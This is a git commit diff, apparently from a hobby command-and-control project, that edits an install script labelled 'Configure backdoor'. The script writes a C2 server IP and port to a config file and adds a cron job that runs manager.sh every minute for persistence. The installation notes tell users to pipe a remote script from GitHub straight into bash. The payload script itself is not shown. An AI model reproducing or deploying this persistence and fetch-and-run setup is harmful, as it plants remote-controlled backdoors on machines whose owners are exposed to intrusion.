10f2edbc5cee592f4b533f675459bd95ea083df3
Anton Forsman <10177340+anforsm@users.noreply.github.com>
2023-10-08 23:19:07 -0500

    fixed install script

--- install.sh
+++ install.sh
@@ -9,8 +9,8 @@ echo "Configure backdoor"
 read -p "Enter server ip: " server_ip
 read -p "Enter server port: " server_port
 rm -f /home/user/conf.py
-echo "SERVER_IP = '$server_ip'\n" >> /home/user/conf.py
-echo "SERVER_PORT = $server_port\n" >> /home/user/conf.py
+echo "SERVER_IP = '$server_ip'" >> /home/user/conf.py
+echo "SERVER_PORT = $server_port" >> /home/user/conf.py
 chmod +x /home/user/manager.sh
 (crontab -l 2>/dev/null; echo "* * * * * /home/user/manager.sh") | crontab -
 echo "Installation complete"
--- installation.md
+++ installation.md
@@ -1,2 +1,2 @@
 ### Installation
-2. run `curl https://raw.githubusercontent.com/anforsm/command_and_control/main/install.sh | bash`
+2. run `curl -s -H 'Cache-Control: no-cache' https://raw.githubusercontent.com/anforsm/command_and_control/main/install.sh | bash`
